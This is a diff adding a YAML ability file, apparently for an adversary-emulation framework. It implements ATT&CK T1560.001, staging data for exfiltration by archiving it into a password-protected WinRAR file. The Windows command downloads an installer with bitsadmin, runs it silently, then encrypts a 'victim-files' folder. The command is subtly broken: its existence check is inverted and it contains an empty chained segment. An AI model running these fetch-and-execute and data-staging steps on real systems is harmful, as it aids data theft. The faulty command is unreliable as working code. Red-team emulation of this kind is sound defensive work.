@@ -1,0 +1,23 @@
+---
+- id: 38a918787f583bb58b28ec495263d7b7
+  name: Compress Data and lock with password for Exfiltration with winrar
+  description: 'Note: Requires winrar installation
+
+    rar a -p"blue" hello.rar (VARIANT)
+
+    '
+  tactic: collection
+  technique:
+    attack_id: T1560.001
+    name: 'Archive Collected Data: Archive via Utility'
+  platforms:
+    windows:
+      cmd:
+        command: if not exist "%programfiles%/WinRAR/Rar.exe"  ( call ) ELSE ( echo
+          Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download
+          /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"
+          %TEMP%\winrar.exe && %TEMP%\winrar.exe /S ) &&   &&  mkdir .\tmp\victim-files
+          && cd .\tmp\victim-files && echo "This file will be encrypted" > .\encrypted_file.txt
+          && "%programfiles%/WinRAR/Rar.exe" a -hp"blue" hello.rar && dir
+        payloads: []
+        cleanup: ''
